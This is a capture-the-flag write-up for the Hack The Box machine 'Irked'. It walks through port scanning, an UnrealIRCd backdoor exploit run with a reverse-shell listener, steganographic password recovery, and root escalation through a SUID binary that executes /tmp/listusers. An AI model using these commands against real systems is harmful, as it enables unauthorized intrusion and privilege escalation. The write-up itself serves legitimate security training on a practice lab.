# Configuration

The operating system that I will be using to tackle this machine is a Kali Linux VM.

What I learnt from other writeups is that it was a good habit to map a domain name to the machine's IP address so as that it will be easier to remember. This can done by appending a line to `/etc/hosts`.

```bash
$ echo "10.10.10.117 irked.htb" | sudo tee -a /etc/hosts 
```

# Reconnaissance

```bash 
rustscan --accessible -a irked.htb -r 1-65535 -- -sT -sV -sC -Pn
File limit higher than batch size. Can increase speed by increasing batch size '-b 1048476'.

# Enumeration (1)

## Port 80 `Apache httpd 2.4.10 ((Debian))`

![](/assets/images/irked1.png)

The message at the bottom right might perhaps be referring to the `IRC` service that found via `nmap`.

## Port 6697 `UnrealIRCd`

Using a `nmap` script, we see that this `unrealircd` has a backdoor.

```bash
$ nmap -sV --script=irc-unrealircd-backdoor -p 6697 irked.htb
Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-20 07:21 EST

# Exploitation (1)

Using this [script](https://github.com/Ranger11Danger/UnrealIRCd-3.2.8.1-Backdoor), I was able to make use of the backdoor and spawn a shell.

```bash
$ python3 exploit.py -payload python irked.htb 6697
Exploit sent successfully!
```

After a while, on our `nc` listener that we setup beforehand, we see that we get a shell as `ircd`.

```bash
$ rlwrap nc -lvnp 1337
listening on [any] 1337 ...
connect to [10.10.XX.XX] from (UNKNOWN) [10.10.10.117] 45622
id
id
uid=1001(ircd) gid=1001(ircd) groups=1001(ircd)
ircd@irked:~/Unreal3.2$
```

# Enumeration (2)

In the home directory of another user `djmardov`, apart from the `user.txt` that we have no access to, there was a file called `.backup`.

```bash
ircd@irked:~/Unreal3.2$ cat .backup
Super elite steg backup pw
UPupDOWNdownLRlrBAbaSSss
```

I tried logging in with `UPupDOWNdownLRlrBAbaSSss`, but unfortunately it was the wrong password. The file said something about `steg`, as in steganography? Perhaps the image we saw on the web server is hiding something?

After installing `steghide`, I used it to check if there is anything hidden in the image.

```bash
$ steghide info irked.jpg 
"irked.jpg":
  format: jpeg
  capacity: 1.5 KB
Try to get information about embedded data ? (y/n) y
Enter passphrase: 
  embedded file "pass.txt":
    size: 17.0 Byte
    encrypted: rijndael-128, cbc
    compressed: yes
```

It tells us that there is a file called `pass.txt`! Lets extract it.

```bash
$ steghide extract -sf irked.jpg
Enter passphrase: 
wrote extracted data to "pass.txt"

$ cat pass.txt
Kab6h+m+bbp2J:HG
```

Could this be the password?

```bash
ircd@irked:~/Unreal3.2$ su djmardov
Kab6h+m+bbp2J:HG

djmardov@irked:~/Documents$ id
uid=1000(djmardov) gid=1000(djmardov) groups=1000(djmardov),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),110(lpadmin),113(scanner),117(bluetooth)
```

We managed to login as `djmardov`.

# user.txt

The user flag is in `djmardov`'s `Documents` directory.

```bash
djmardov@irked:~/Documents$ cat user.txt
4a66XXXXXXXXXXXXXXXXXXXXXXXXXXXX
```

# Enumeration (3)

Using [`linux-smart-enumeration`](https://github.com/diego-treitos/linux-smart-enumeration), we see that there is a `SUID` binary `viewuser` that stood out.

```bash
djmardov@irked:/tmp$ ./lse.sh
...
[*] fst010 Binaries with setuid bit........................................ yes!                                   
[!] fst020 Uncommon setuid binaries........................................ yes!                                   
---
/usr/bin/X
/usr/bin/viewuser
...
```

Upon running `viewuser`, we see that it is looking for a file called `/tmp/listusers` but it doesn't exist. Could it perhaps be trying to execute it?

```bash
djmardov@irked:/tmp$ viewuser
This application is being devleoped to set and test user permissions
It is still being actively developed
(unknown) :0           2021-01-20 08:03 (:0)
sh: 1: /tmp/listusers: not found
```

# Exploitation (2)

Lets create `/tmp/listusers` that will contain the `/bin/bash` command.

```bash
djmardov@irked:/tmp$ echo "/bin/bash" > /tmp/listusers
djmardov@irked:/tmp$ chmod +x /tmp/listusers
```

And then we run `/tmp/listusers`.

```bash
djmardov@irked:/tmp$ viewuser
This application is being devleoped to set and test user permissions
It is still being actively developed
(unknown) :0           2021-01-20 08:03 (:0)
root@irked:/tmp# id
uid=0(root) gid=1000(djmardov) groups=1000(djmardov),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),110(lpadmin),113(scanner),117(bluetooth)
```

We managed to get a shell as `root`!

# root.txt

The root flag is in `root`'s home directory.

```bash
root@irked:/tmp# cat /root/root.txt
8d8eXXXXXXXXXXXXXXXXXXXXXXXXXXXX
```

### Rooted ! Thank you for reading and look forward for more writeups and articles !
